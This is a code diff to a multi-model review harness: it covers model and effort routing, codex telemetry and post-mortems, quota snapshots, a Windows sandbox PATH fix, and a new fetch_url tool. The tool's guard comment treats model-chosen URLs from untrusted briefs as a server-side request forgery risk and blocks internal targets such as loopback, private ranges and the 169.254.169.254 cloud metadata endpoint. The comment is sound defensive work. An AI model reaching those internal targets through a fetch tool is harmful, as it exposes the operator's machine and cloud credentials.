@@ -153,8 +153,20 @@ def _read_sse(resp):
     return out
 
 
-def call_http_reviewer(brief, system, tier, marker, timeout=2400):
-    """Probe, then the real call, with retries that distinguish network blips from refusals."""
+def call_http_reviewer(brief, system, tier, marker, timeout=2400, model=None, name="spark",
+                       effort=None):
+    """Probe, then the real call, with retries that distinguish network blips from refusals.
+
+    `model` comes from the routing plan, i.e. from channels.json. 🔴 Until 2026-08-06 it did not
+    exist and the model was read straight out of MODEL_NAME with a hard-coded fallback, so
+    `channels.spark.model` was decorative - the SAME defect codex carried until 2026-08-02, in
+    the same file, discovered four days later because the earlier fix was applied to the one
+    instance rather than to the class. MODEL_NAME still works, because a documented escape hatch
+    that stops working is its own kind of trap, but it can no longer win in silence.
+
+    `name` exists because two channels now share this function (spark 1.1 and spark 1.2 run in
+    parallel) and a log line reading `[http]` twice describes neither of them.
+    """
     key = os.environ.get("MODEL_API_KEY")
     if not key and os.name == "nt":
         try:                                  # PowerShell setx writes here; the process env may lag
@@ -167,7 +179,21 @@ def call_http_reviewer(brief, system, tier, marker, timeout=2400):
         return {"channel": "http", "ok": False, "error": "MODEL_API_KEY not set"}
 
     url = os.environ.get("MODEL_API_BASE", "https://api.meta.ai/v1").rstrip("/") + "/messages"
-    model = os.environ.get("MODEL_NAME", "muse-spark-1.1")
+    # 🔴 The REGISTRY wins over MODEL_NAME whenever the registry named a model, and this is not
+    # the usual "explicit env beats config" convention - it is the opposite, on purpose. Two
+    # channels now share this endpoint, so one process-wide environment variable would force
+    # BOTH onto the same model while the resolved plan went on printing two different ones: the
+    # panel silently collapses to a single voice and the printout says otherwise. An override
+    # that can only be applied to every channel at once is not an override, it is a footgun.
+    # MODEL_NAME still governs when there is no registry (the degraded, no-routing path).
+    env_model = os.environ.get("MODEL_NAME")
+    if model and env_model and env_model != model:
+        log("  [%s] NOTE: MODEL_NAME=%s is set in the environment; the registry names %s for "
+            "this channel and the REGISTRY WINS (a single env var cannot address one of several "
+            "channels on this endpoint). Use --set %s=<model> to change it."
+            % (name, env_model, model, name))
+    model = model or env_model or "muse-spark-1.1"
+    log("  [%s] model=%s" % (name, model))
     cfg = TIERS[tier]
     base = {"model": model, "system": system, "messages": [{"role": "user", "content": brief}]}
 
@@ -178,7 +204,7 @@ def call_http_reviewer(brief, system, tier, marker, timeout=2400):
     t0 = time.time()
     try:
         _post(url, probe, key, 240, stream=False)
-        log("  [http] probe OK in %.0fs" % (time.time() - t0))
+        log("  [%s] probe OK in %.0fs" % (name, time.time() - t0))
     except urllib.error.HTTPError as e:
         msg = e.read().decode("utf-8", errors="replace")[:400]
         if "content management policy" in msg or e.code == 403:
@@ -200,14 +226,24 @@ def call_http_reviewer(brief, system, tier, marker, timeout=2400):
     # identical payload WITHOUT output_config returned 17 902 chars and ~50 web-search
     # blocks in 152s. Since it is a 200 and not a 400, none of the HTTPError branches below
     # can see it - hence the explicit sse_error retry.
+    #
+    # 🔴 `effort` NOW COMES FROM THE TIER, and until 2026-08-06 it was the literal "xhigh" for
+    # every tier - which made the tier ladder decorative on this channel. Meta's own docs:
+    # `thinking: {type:"enabled", budget_tokens:n}` is "accepted for compatibility but not
+    # translated into an effort value", so the budget the tier varies is inert and the one field
+    # that sets depth was pinned. `max` is NOT a legal value here despite appearing in the
+    # vendor's OpenAPI enum - probed on both Spark models, 400 on both, and an invented value
+    # gives the same 400, which is the control that proves the field is validated at all.
+    effort = effort or "xhigh"
     payload = dict(base,
                    max_tokens=MAX_TOKENS,
                    thinking=cfg["thinking"],
-                   output_config={"effort": "xhigh"},
+                   output_config={"effort": effort},
                    tools=[{"type": "web_search_20250305", "name": "web_search"}])
     if stream:
         payload["stream"] = True
-    log("  [http] tier=%s budget=%s stream=%s" % (tier, budget or "adaptive", stream))
+    log("  [%s] tier=%s effort=%s budget=%s stream=%s"
+        % (name, tier, effort, budget or "adaptive", stream))
 
     t0 = time.time()
     last = None
@@ -216,15 +252,21 @@ def call_http_reviewer(brief, system, tier, marker, timeout=2400):
             data, _ = _post(url, payload, key, timeout, stream)
             sse_err = data.get("sse_error") if isinstance(data, dict) else None
             if sse_err and "output_config" in payload:
-                log("  [http] 200+SSE error (%s) - dropping output_config and retrying"
-                    % sse_err[:80])
+                log("  [%s] 200+SSE error (%s) - dropping output_config and retrying"
+                    % (name, sse_err[:80]))
                 payload.pop("output_config")
                 last = "sse_error: %s" % sse_err
                 continue
             if sse_err:
                 return {"channel": "http", "ok": False,
                         "error": "endpoint streamed an error frame: %s" % sse_err}
-            return _verify_http(data, marker, cfg["floor"], time.time() - t0, tier)
+            res = _verify_http(data, marker, cfg["floor"], time.time() - t0, tier)
+            # What was actually sent, carried back so the status line and diagnostics report the
+            # run rather than the config. `output_config` is dropped on an SSE api_error retry,
+            # so "the effort we asked for" and "the effort that survived" are not the same fact.
+            res["effort"] = payload.get("output_config", {}).get("effort")
+            res["model"] = model
+            return res
         except urllib.error.HTTPError as e:
             body = e.read().decode("utf-8", errors="replace")[:400]
             last = "HTTP %d: %s" % (e.code, body)
@@ -234,7 +276,7 @@ def call_http_reviewer(brief, system, tier, marker, timeout=2400):
                 payload["thinking"] = ({"type": "adaptive", "display": "summarized"}
                                        if cfg["thinking"]["type"] == "enabled"
                                        else {"type": "enabled", "budget_tokens": 60000})
-                log("  [http] 400 on thinking shape - flipping form and retrying")
+                log("  [%s] 400 on thinking shape - flipping form and retrying" % name)
                 continue
             if e.code == 401 or "content management policy" in body:
                 break                                  # never retry auth or filter unchanged
@@ -246,7 +288,7 @@ def call_http_reviewer(brief, system, tier, marker, timeout=2400):
             # gaierror / getaddrinfo failed / connection reset. A real run died here once and
             # took the whole orchestration with it, because urllib has no retry of its own.
             last = "transport: %r" % (e,)
-            log("  [http] %s - retry %d/3 in %ds" % (last, attempt + 1, 2 ** attempt))
+            log("  [%s] %s - retry %d/3 in %ds" % (name, last, attempt + 1, 2 ** attempt))
             time.sleep(2 ** attempt)
     return {"channel": "http", "ok": False, "error": last}
 
@@ -370,23 +412,99 @@ def refusal_check(text, marker=None, min_chars=800):
     return None
 
 
-def _run(cmd, stdin_text=None, timeout=3000, cwd=None, stdout_path=None):
+def _run(cmd, stdin_text=None, timeout=3000, cwd=None, stdout_path=None, env=None):
     """
     stdout_path streams stdout straight to a file instead of buffering it. agy's stream-json log
     is tens of thousands of lines; more importantly, a run that is killed or times out still
     leaves a partial log on disk, which is the difference between "we know it searched 22 times
     before dying" and "no evidence at all".
+
+    🔴 That reasoning was written for agy and applied only to agy. On 2026-08-05 codex was killed
+    at the 3000-second default having produced its whole analysis, and left ZERO bytes, because it
+    was given `-o outfile` (written at the end) and no stdout_path. The only surviving evidence was
+    codex's own rollout in ~/.codex/sessions, which this harness never looked at. Both are fixed.
     """
     t0 = time.time()
     if stdout_path:
         with open(stdout_path, "w", encoding="utf-8") as out:
             p = subprocess.run(cmd, input=stdin_text, stdout=out, stderr=subprocess.PIPE,
                                text=True, encoding="utf-8", errors="replace",
-                               timeout=timeout, cwd=cwd)
+                               timeout=timeout, cwd=cwd, env=env)
     else:
         p = subprocess.run(cmd, input=stdin_text, capture_output=True, text=True,
-                           encoding="utf-8", errors="replace", timeout=timeout, cwd=cwd)
+                           encoding="utf-8", errors="replace", timeout=timeout, cwd=cwd, env=env)
     return p, time.time() - t0
+
+
+def sandbox_shell_dir():
+    """A directory holding a `pwsh.exe` that the Codex Windows sandbox can actually SPAWN.
+
+    🔴🔴 MEASURED 2026-08-05. Codex's shell tool was dead on this machine and the harness could
+    not see it. Every shell command the model issued came back as::
+
+        windows sandbox: runner failed during SpawnChild:
+        CreateProcessAsUserW failed: 5 (access denied)
+        cmd="C:\\Program Files\\WindowsApps\\Microsoft.PowerShell_..._x64__8wekyb3d8bbwe\\pwsh.exe"
+
+    The cause is not the sandbox: `cmd.exe` and a non-Store `powershell.exe` both spawn fine under
+    it. It is that PowerShell 7 was installed from the **Microsoft Store**, and a WindowsApps
+    package is ACL-locked to its own package identity, so a lowered/impersonated token gets
+    ACCESS_DENIED. `winget install Microsoft.PowerShell` does NOT help - its default installer for
+    that id is the msix, i.e. the same package.
+
+    Reproduced three ways under `codex sandbox`: Store pwsh -> error 5; `powershell.exe` 5.1 -> ok;
+    a plain-ZIP PowerShell 7 in a user folder -> ok. So the fix is any pwsh outside WindowsApps,
+    and it is applied to the codex CHILD PROCESS ONLY, by prepending this directory to its PATH.
+    Nothing machine-wide changes: `pwsh` keeps resolving to the Store build for every other
+    program, which is the whole point - the Store copy may be what the system itself uses.
+
+    No username is written into any config: the env var wins, then the standard MSI location, then
+    `~/pwsh7`. A hard-coded absolute path here would ship someone's home directory to the public
+    kit that `package.py` generates from this file.
+    """
+    if os.name != "nt":
+        return None
+    cand = []
+    env_dir = os.environ.get("CODEX_SHELL_DIR")
+    if env_dir:
+        cand.append(env_dir)
+    cand += [r"C:\Program Files\PowerShell\7", os.path.expanduser(r"~\pwsh7")]
+    for d in cand:
+        try:
+            if d and os.path.isfile(os.path.join(d, "pwsh.exe")) and "windowsapps" not in d.lower():
+                return d
+        except OSError:
+            continue
+    return None
+
+
+def _codex_env():
+    """The codex child's environment, with a spawnable pwsh put ahead of the Store one."""
+    d = sandbox_shell_dir()
+    if not d:
+        return None
+    env = dict(os.environ)
+    env["PATH"] = d + os.pathsep + env.get("PATH", "")
+    return env
+
+
+def _seconds(v, fallback):
+    """`"25m"` / `"90s"` / `1500` / `None` -> seconds. Config is written the way agy's flag is."""
+    if v is None or v == "":
+        return fallback
+    try:
+        if isinstance(v, (int, float)):
+            return int(v)
+        s = str(v).strip().lower()
+        if s.endswith("m"):
+            return int(float(s[:-1]) * 60)
+        if s.endswith("h"):
+            return int(float(s[:-1]) * 3600)
+        if s.endswith("s"):
+            return int(float(s[:-1]))
+        return int(float(s))
+    except (TypeError, ValueError):
+        return fallback
 
 
 # Firecrawl tools Codex must not be able to call. Costs verified on docs.firecrawl.dev
@@ -629,9 +747,25 @@ def write_diagnostics(outdir, payload):
         path = os.path.join(outdir, "diagnostics.json")
         with open(path, "w", encoding="utf-8") as f:
             json.dump(payload, f, indent=2, ensure_ascii=False, default=str)
-        return path
     except Exception:
         return None
+    # REPORT.md beside it, from the SAME payload. The JSON has always been generated to a fixed
+    # schema; the prose report was not - every session composed its own by hand, and a
+    # hand-written summary omits the setting its author did not think to mention. Igor,
+    # 2026-08-07: «он должен писать какой тир он выбрал ... а то вдруг он выберет слабый ответ,
+    # а я это и не узнаю». A tier is invisible in the output, so it has to be structural.
+    # Never fatal: a missing report must not cost the run its diagnostics.
+    try:
+        _here = os.path.dirname(os.path.abspath(__file__))
+        if _here not in sys.path:
+            sys.path.insert(0, _here)   # this module may be imported from another cwd
+        import report as _report
+        with open(os.path.join(outdir, "REPORT.md"), "w", encoding="utf-8") as f:
+            f.write(_report.render(payload))
+    except Exception as exc:
+        log("  note: REPORT.md could not be rendered (%r). diagnostics.json is unaffected; "
+            "run report.py against it by hand." % (exc,))
+    return path
 
 
 # How many cited URLs to probe per channel. A review normally cites 10-35; a runaway answer can
@@ -765,7 +899,10 @@ def environment_report(want=()):
         "spark_key_length": len(key),
         "spark_endpoint": os.environ.get("MODEL_API_BASE", "https://api.meta.ai/v1"),
     }
-    for name, resolver in (("codex", codex_bin), ("agy", agy_bin), ("kimi", hermes_bin)):
+    # Keyed on the BINARY each entry actually probes, not on a channel that once used it:
+    # `kimi_installed` reported the presence of the Hermes CLI, which the kimi channel stopped
+    # using on 2026-08-03 - a true value about the wrong thing, which is worse than a missing one.
+    for name, resolver in (("codex", codex_bin), ("agy", agy_bin), ("hermes", hermes_bin)):
         try:
             b = resolver()
             found = bool(os.path.isfile(b) or shutil.which(b))
@@ -867,7 +1004,322 @@ def _with_system(brief, system):
     return system.rstrip() + "\n\n---\n\n" + brief
 
 
-def call_codex(brief, marker, workdir, outfile, model=None, effort=None, system=None):
+def _registry_default(channel, field, fallback):
+    """Значение канала из channels.json — ОДИН дом вместо двух.
+
+    🔴 Найдено 2026-08-02 при выполнении просьбы «поменяй модель 5.5 на 5.4». Модель codex жила
+    в ДВУХ местах: записью в channels.json и литералом здесь. Действовал литерал: call_codex
+    получает model=None почти отовсюду (в частности из проектного aos_review.py) и падал на
+    `os.environ.get("CODEX_MODEL", "gpt-5.5")`. То есть правка реестра — того самого файла, чей
+    комментарий обещает «exactly one place to edit when a weekly limit runs out», — не меняла
+    ни одного вызова, и заметить это можно было только чтением кода.
+
+    Литерал остаётся ТОЛЬКО как аварийный запас: реестр может быть повреждён или недоступен, и
+    тогда лучше дорогой запуск на разумной модели, чем падение посреди раунда.
+    """
+    try:
+        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "channels.json")
+        with open(p, encoding="utf-8") as fh:
+            v = json.load(fh)["channels"][channel].get(field)
+        return v or fallback
+    except Exception:                                     # noqa: BLE001
+        return fallback
+
+
+def codex_postmortem(started_after=None):
+    """What codex was doing when it died, read from ITS OWN rollout log.
+
+    🔴 Codex reports no telemetry to us and writes its report only at the very end, so a killed run
+    used to leave literally nothing: the harness printed `[codex] PROBLEM ?s  timed out` and the
+    suggested fix was "raise the timeout" - advice that was both unactionable (no codex timeout
+    existed to raise) and wrong (it had been idle for 33 of its 50 minutes).
+
+    But codex DOES keep a full rollout at ~/.codex/sessions/YYYY/MM/DD/rollout-*.jsonl, and that
+    file answered every question in five minutes once anyone thought to open it: the sandbox error,
+    the token trajectory, and a token counter frozen at 823 376 in for 33 minutes while the last
+    record was a `web_search_call` with an EMPTY query. Returns a short human-readable diagnosis;
+    never raises, because a post-mortem that can fail takes the corpse with it.
+    """
+    try:
+        root = os.path.join(os.path.expanduser("~"), ".codex", "sessions")
+        newest, newest_m = None, 0
+        for dirpath, _dirnames, filenames in os.walk(root):
+            for fn in filenames:
+                if fn.startswith("rollout-") and fn.endswith(".jsonl"):
+                    p = os.path.join(dirpath, fn)
+                    m = os.path.getmtime(p)
+                    if m > newest_m and (started_after is None or m >= started_after - 60):
+                        newest, newest_m = p, m
+        if not newest:
+            return None
+        rows = []
+        with open(newest, encoding="utf-8", errors="replace") as f:
+            for line in f:
+                line = line.strip()
+                if line:
+                    try:
+                        rows.append(json.loads(line))
+                    except ValueError:
+                        pass
+        sandbox_errs, toks, last_kind, last_ts = 0, [], "", ""
+        for r in rows:
+            pay = r.get("payload")
+            if not isinstance(pay, dict):
+                continue
+            k = pay.get("type") or ""
+            if k:
+                last_kind, last_ts = k, r.get("timestamp", "")
+            if k == "function_call_output" and "windows sandbox" in str(pay.get("output", "")):
+                sandbox_errs += 1
+            if k == "token_count":
+                t = (pay.get("info") or {}).get("total_token_usage") or {}
+                toks.append((r.get("timestamp", ""), t.get("input_tokens"), t.get("output_tokens")))
+        bits = ["rollout %s (%d records)" % (os.path.basename(newest), len(rows))]
+        if sandbox_errs:
+            bits.append("%d shell command(s) failed with a Windows sandbox spawn error - the shell "
+                        "tool is DEAD on this machine; see sandbox_shell_dir()" % sandbox_errs)
+        if toks:
+            frozen = sum(1 for i in range(1, len(toks)) if toks[i][1:] == toks[i - 1][1:])
+            bits.append("tokens in=%s out=%s at the end; %d of %d counter ticks showed NO progress"
+                        % (toks[-1][1], toks[-1][2], frozen, len(toks) - 1))
+            if frozen and frozen >= (len(toks) - 1) / 2.0:
+                bits.append("STALLED, not slow: the model stopped consuming tokens long before it "
+                            "was killed. Raising the timeout will not help")
+        bits.append("last record: %s at %s" % (last_kind or "?", last_ts or "?"))
+        return " | ".join(bits)
+    except Exception as exc:                                              # noqa: BLE001
+        return "post-mortem unavailable (%s)" % type(exc).__name__
+
+
+def _parse_codex_events(path):
+    """Token usage for the one channel this harness kept calling un-instrumented.
+
+    `codex exec --json` writes JSONL to stdout. Measured on codex-cli 0.147.0, a whole run is
+    four event types: thread.started, turn.started, item.completed, turn.completed - and the last
+    one carries::
+
+        {"type":"turn.completed","usage":{"input_tokens":20298,"cached_input_tokens":1920,
+         "cache_write_input_tokens":0,"output_tokens":19,"reasoning_output_tokens":10}}
+
+    Two things this parser must survive, both observed rather than imagined:
+
+    NON-JSON LINES ARE INTERLEAVED. The Rust MCP transport logs to the same stream
+    (`ERROR rmcp::transport::worker: worker quit with fatal ...`). A parser that assumed every
+    line is JSON would die on an unrelated GitLab auth warning and report no tokens at all -
+    which is indistinguishable from the vendor not reporting any, i.e. exactly the false belief
+    this function exists to end.
+
+    THE SCHEMA IS NOT PROMISED. If the field names move, every value below goes to None and the
+    caller prints what it has. A telemetry reader must never be able to fail a run: the numbers
+    are why we look, not why we ran.
+    """
+    out = {}
+    if not path or not os.path.exists(path):
+        return out
+    usage, turns, msgs = None, 0, 0
+    try:
+        with open(path, encoding="utf-8", errors="replace") as f:
+            for line in f:
+                line = line.strip()
+                if not line.startswith("{"):
+                    continue                       # stderr from the MCP transport; not ours
+                try:
+                    ev = json.loads(line)
+                except ValueError:
+                    continue
+                kind = ev.get("type")
+                if kind == "turn.completed":
+                    turns += 1
+                    if isinstance(ev.get("usage"), dict):
+                        usage = ev["usage"]        # last one wins: it is cumulative for the turn
+                elif kind == "item.completed":
+                    if ((ev.get("item") or {}).get("type")) == "agent_message":
+                        msgs += 1
+    except OSError:
+        return out
+    if turns:
+        out["turns"] = turns
+    if msgs:
+        out["agent_messages"] = msgs
+    if usage:
+        out["in_tokens"] = usage.get("input_tokens")
+        out["out_tokens"] = usage.get("output_tokens")
+        out["reasoning_tokens"] = usage.get("reasoning_output_tokens")
+        out["cached_in_tokens"] = usage.get("cached_input_tokens")
+    return out
+
+
+def codex_rate_limits(workdir, started_after=None):
+    """How much of the weekly subscription this account has left, from codex's own rollout.
+
+    Igor runs this channel on a ChatGPT subscription with a hard weekly window, and the harness
+    had no way to see it - so an expensive round could be launched against an exhausted limit and
+    only discover it by the answer coming back thin. Round 25 ran at **used_percent 100.0** and
+    nothing anywhere said so; it completed on plan credits.
+
+    The rollout is matched on `session_meta.cwd` == the workspace we handed this run, NOT on
+    newest-mtime. Two channels can be in flight at once and the operator may have an interactive
+    codex open in another window; picking the newest file would attribute a stranger's numbers to
+    this run, which is worse than reporting nothing. Returns None rather than raising, for the
+    same reason as the post-mortem: an accounting read must not be able to kill the run.
+    """
+    try:
+        root = os.path.join(os.path.expanduser("~"), ".codex", "sessions")
+        want = os.path.normcase(os.path.abspath(workdir))
+        best, best_m = None, 0
+        for dirpath, _dirnames, filenames in os.walk(root):
+            for fn in filenames:
+                if not (fn.startswith("rollout-") and fn.endswith(".jsonl")):
+                    continue
+                p = os.path.join(dirpath, fn)
+                m = os.path.getmtime(p)
+                if m <= best_m or (started_after is not None and m < started_after - 60):
+                    continue
+                with open(p, encoding="utf-8", errors="replace") as f:
+                    head = f.readline()
+                try:
+                    meta = json.loads(head).get("payload") or {}
+                except ValueError:
+                    continue
+                if os.path.normcase(os.path.abspath(meta.get("cwd") or "")) == want:
+                    best, best_m = p, m
+        if not best:
+            return None
+        limits, window = None, None
+        with open(best, encoding="utf-8", errors="replace") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    r = json.loads(line)
+                except ValueError:
+                    continue
+                pay = r.get("payload")
+                if isinstance(pay, dict) and pay.get("type") == "token_count":
+                    if isinstance(pay.get("rate_limits"), dict):
+                        limits = pay["rate_limits"]
+                    window = ((pay.get("info") or {}).get("model_context_window")) or window
+        if not limits:
+            return None
+        pri = limits.get("primary") or {}
+        out = {"used_percent": pri.get("used_percent"),
+               "window_minutes": pri.get("window_minutes"),
+               "plan_type": limits.get("plan_type"),
+               "has_credits": (limits.get("credits") or {}).get("has_credits"),
+               "context_window": window,
+               "rollout": best}
+        if pri.get("resets_at"):
+            try:
+                out["resets_at"] = datetime.datetime.fromtimestamp(
+                    pri["resets_at"]).isoformat(timespec="seconds")
+            except (OverflowError, OSError, ValueError):
+                pass
+        return out
+    except Exception:
+        return None
+
+
+def codex_quota_snapshot(timeout=12):
+    """How much of the weekly ChatGPT window is left - BEFORE the round, for free.
+
+    This is the one preflight that could not previously exist. Igor runs this channel on a
+    subscription with a hard 7-day window, and the only way to discover it was exhausted was to
+    spend 20-40 minutes finding out. Round 25 ran at 100% used and nothing said so.
+
+    `codex app-server` speaks JSON-RPC over stdio and answers `account/rateLimits/read` in about
+    half a second with NO model turn and NO token spend - measured 0.50s on this machine
+    2026-08-07, returning usedPercent 100 on a 10080-minute window.
+
+    🔴 IT IS A CACHED SNAPSHOT, NOT A LIVE READING, and that limitation is architectural rather
+    than a gap someone will close. From the Codex maintainer on issue #10233, verbatim: «much of
+    the information that /status displays is valid only within the context of a thread. Usage
+    limits are returned to the client by the responses endpoint. They're returned as HTTP
+    headers. A responses call requires a thread.» So the numbers come from the last real call.
+    That makes this reliable for "am I already exhausted" - the case that matters - and unable to
+    see quota consumed by another client since. Upstream issue #33897 reports staleness on first
+    read. Never gate a run on it; report it and let the human decide.
+
+    Field names differ between the two places this data appears: app-server v2 is camelCase
+    (usedPercent / windowDurationMins / resetsAt / planType) while the rollout JSONL is
+    snake_case. Both are read, because assuming one naming is how a reader silently returns None.
+
+    Returns a human-readable line, or None. Never raises: a quota reading must not be able to
+    stop a round that the operator has already decided to pay for.
+    """
+    try:
+        binary = codex_bin()
+        if not (os.path.isfile(binary) or shutil.which(binary)):
+            return None
+        proc = subprocess.Popen([binary, "app-server"],
+                                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                stderr=subprocess.DEVNULL, text=True,
+                                encoding="utf-8", errors="replace", bufsize=1)
+    except Exception:
+        return None
+    try:
+        for msg in ({"jsonrpc": "2.0", "id": 1, "method": "initialize",
+                     "params": {"clientInfo": {"name": "orchestrate",
+                                               "title": "orchestrate", "version": "1"}}},
+                    {"jsonrpc": "2.0", "method": "initialized", "params": {}},
+                    {"jsonrpc": "2.0", "id": 7, "method": "account/rateLimits/read",
+                     "params": {}}):
+            proc.stdin.write(json.dumps(msg) + "\n")
+        proc.stdin.flush()
+        deadline, got = time.time() + timeout, None
+        while time.time() < deadline:
+            line = proc.stdout.readline()
+            if not line:
+                break
+            try:
+                m = json.loads(line)
+            except ValueError:
+                continue
+            if m.get("id") == 7:
+                got = m
+                break
+        if not got:
+            return None
+        if got.get("error"):
+            # -32001 "Server overloaded; retry later" is documented. Not worth a retry here:
+            # this is an optional courtesy reading in front of a run that is about to happen.
+            return None
+        rl = ((got.get("result") or {}).get("rateLimits") or {})
+        pri = rl.get("primary") or {}
+        used = pri.get("usedPercent", pri.get("used_percent"))
+        if used is None:
+            return None
+        mins = pri.get("windowDurationMins", pri.get("window_minutes")) or 0
+        when = ""
+        resets = pri.get("resetsAt", pri.get("resets_at"))
+        if resets:
+            try:
+                when = ", resets " + datetime.datetime.fromtimestamp(
+                    resets).isoformat(timespec="minutes")
+            except (OverflowError, OSError, ValueError):
+                pass
+        creds = rl.get("credits") or {}
+        has = creds.get("hasCredits", creds.get("has_credits"))
+        line = ("subscription quota %.0f%% used of a %dh window%s (plan=%s, credits=%s) "
+                "- cached snapshot from the last call, not live"
+                % (used, round(mins / 60.0), when,
+                   rl.get("planType", rl.get("plan_type")), has))
+        if used >= 95:
+            line += ("  ⚠ WEEKLY LIMIT EXHAUSTED - this run will draw on credits. Consider "
+                     "--skip codex, or switch channel. Never open a metered API path to route "
+                     "around a subscription limit.")
+        return line
+    except Exception:
+        return None
+    finally:
+        try:
+            proc.kill()
+        except Exception:
+            pass
+
+
+def call_codex(brief, marker, workdir, outfile, model=None, effort=None, system=None,
+               timeout=None):
     """
     Prompt goes on STDIN and argv ends with "-". A positional prompt while something else pipes
     stdin makes it hang on 'Reading additional input from stdin...'.
@@ -885,8 +1337,11 @@ def call_codex(brief, marker, workdir, outfile, model=None, effort=None, system=
     # edited: that file is his. Probe any unfamiliar model name cheaply before a real run.
     # Precedence: the resolved plan (registry + --route) beats the env var beats the default.
     # The env vars stay supported because existing project scripts set them inline.
-    model = model or os.environ.get("CODEX_MODEL", "gpt-5.5")
-    effort = effort or os.environ.get("CODEX_EFFORT", "xhigh")
+    # 2026-08-02: значение переехало в channels.json (см. _registry_default выше). Литерал ниже
+    # — аварийный запас на случай повреждённого реестра, а не источник истины.
+    model = model or os.environ.get("CODEX_MODEL") or _registry_default("codex", "model", "gpt-5.4")
+    effort = (effort or os.environ.get("CODEX_EFFORT")
+              or _registry_default("codex", "effort", "xhigh"))
     cmd = [binary, "exec",
            "--sandbox", "read-only",
            "--skip-git-repo-check",          # -C often points outside a git repo
@@ -896,14 +1351,40 @@ def call_codex(brief, marker, workdir, outfile, model=None, effort=None, system=
            "-c", 'model_reasoning_effort="%s"' % effort,
            "-c", "tools.web_search=true",    # NOT --search: that flag does not exist and kills the launch
            "-c", deny,                       # Firecrawl credit policy; see FIRECRAWL_DENY above
+           # 🔴 2026-08-07: THE "NO TELEMETRY" CLAIM WAS HALF FALSE, and the half that was false
+           # is the half anyone asks about. This channel reports no TOOL telemetry - it never says
+           # which pages it opened - and that got written down, in this file and in three others,
+           # as "reports nothing at all". `codex exec --json` streams events to stdout, and the
+           # closing `turn.completed` carries the full usage block. Igor, 2026-08-07: «можно даже
+           # тупо посчитать самому, раз api (codex cli) не выдает такие данные» - he was right that
+           # counting locally was possible, and the premise turned out not to need it. Estimating
+           # what the vendor already reports is the expensive way to be approximately wrong.
+           "--json",
            "-o", outfile,                    # read-only sandbox still writes the report through -o
            "-"]
+    # 🔴 The progress stream goes to disk, so a killed run is not a total loss. See _run.
+    # With --json this file is now the EVENT STREAM, which is strictly more recoverable than the
+    # prose it replaced: `item.completed` carries the agent's message text, so a run killed after
+    # its final message but before -o is flushed is no longer a total loss either.
+    progress = os.path.join(os.path.dirname(outfile) or ".", "CODEX.progress.log")
+    limit = _seconds(timeout, 3000)
+    t0 = time.time()
     try:
-        p, secs = _run(cmd, stdin_text=_with_system(brief, system))
+        p, secs = _run(cmd, stdin_text=_with_system(brief, system), timeout=limit,
+                       stdout_path=progress, env=_codex_env())
     except FileNotFoundError:
         return {"channel": "codex", "ok": False, "error": "binary not found: " + binary}
     except subprocess.TimeoutExpired:
-        return {"channel": "codex", "ok": False, "error": "timed out; deep reviews run 25-35 min"}
+        # 🔴 The elapsed time used to be dropped HERE, in the one branch that exists because
+        # elapsed time ran out - so the run log printed "?s" and nobody could tell a 20-minute
+        # cutoff from a 50-minute one. It also claimed "deep reviews run 25-35 min", implying it
+        # needed longer, on a run that had been idle for 33 of its 50 minutes.
+        waited = round(time.time() - t0, 1)
+        why = codex_postmortem(started_after=t0)
+        return {"channel": "codex", "ok": False, "seconds": waited,
+                "model": model, "effort": effort, "progress_log": progress,
+                "error": "killed after %.0fs (limit %ds). %s"
+                         % (waited, limit, why or "no rollout found to explain it")}
 
     text = ""
     if os.path.exists(outfile):
@@ -918,8 +1399,19 @@ def call_codex(brief, marker, workdir, outfile, model=None, effort=None, system=
     refusal = refusal_check(text, marker)
     if refusal:
         warn.append(refusal)
-    return {"channel": "codex", "ok": not warn, "text": text, "seconds": round(secs, 1),
-            "bytes": len(text.encode("utf-8")), "exit": p.returncode, "warnings": warn}
+    # 🔴 model/effort ВОЗВРАЩАЮТСЯ с 2026-08-02. До этого дня канал не сообщал, на чём он
+    # отработал, и в АНАЛИТИКА.md колонка «усилие» у codex всегда стояла «—». Значит просьбу
+    # «поменяй 5.5 на 5.4» нельзя было проверить по артефактам прогона — только чтением кода.
+    # Настройка, которую невозможно наблюдать в выходе, неотличима от настройки, которая не
+    # применилась: ровно так декоративная запись в channels.json и прожила незамеченной.
+    out = {"channel": "codex", "ok": not warn, "text": text, "seconds": round(secs, 1),
+           "bytes": len(text.encode("utf-8")), "exit": p.returncode, "warnings": warn,
+           "model": model, "effort": effort}
+    out.update(_parse_codex_events(progress))
+    rl = codex_rate_limits(workdir, started_after=t0)
+    if rl:
+        out["rate_limit"] = rl
+    return out
 
 
 def hermes_bin():
@@ -1018,6 +1510,431 @@ def call_hermes(brief, marker, outfile, model=None, toolsets=None, system=None, 
     return {"channel": "kimi", "ok": not warn, "text": text, "seconds": round(secs, 1),
             "bytes": len(text.encode("utf-8")), "exit": p.returncode,
             "model": model, "warnings": warn}
+
+
+OPENROUTER_URL = os.environ.get("OPENROUTER_BASE",
+                                "https://openrouter.ai/api/v1/chat/completions")
+
+
+FETCH_TOOL_SCHEMA = {
+    "type": "function",
+    "function": {
+        "name": "fetch_url",
+        "description": (
+            "Fetch the full text of a web page you have already found. Use this whenever you are "
+            "about to QUOTE a source: search results are short query-selected excerpts with "
+            "elisions, and a quotation assembled from them can splice two disjoint fragments "
+            "into a sentence the page never contained. Fetch the page and quote from the fetched "
+            "text. Returns plain text, truncated if very long."),
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "url": {"type": "string",
+                        "description": "Absolute http(s) URL of the page to fetch."}},
+            "required": ["url"]},
+    },
+}
+
+# Refuse anything that is not a public web page. The MODEL chooses this URL, and the brief it is
+# reasoning about is untrusted text, so `fetch_url` is a server-side request forgery primitive
+# pointed at the operator's own machine unless it is fenced. Blocked: non-http schemes (file://,
+# gopher://), loopback, RFC1918, link-local (including 169.254.169.254, the cloud metadata
+# endpoint), CGNAT, multicast and reserved ranges - checked AFTER DNS resolution and again after
+# every redirect, because a public hostname can resolve to 127.0.0.1 and a public URL can redirect
+# to one. This is the same lesson as the agy toolset fence: a review channel needs to read the
+# public web and nothing else, and the restriction has to be mechanical.
+FETCH_MAX_BYTES = 400_000
+FETCH_MAX_REDIRECTS = 3
+
+
+def _fetch_guard_host(host):
+    """Return None if the host resolves only to public addresses, else the reason to refuse."""
+    import ipaddress
+    import socket
+    if not host:
+        return "no host in URL"
+    try:
+        infos = socket.getaddrinfo(host, None)
+    except socket.gaierror as e:
+        return "DNS failed: %s" % (e,)
+    for info in infos:
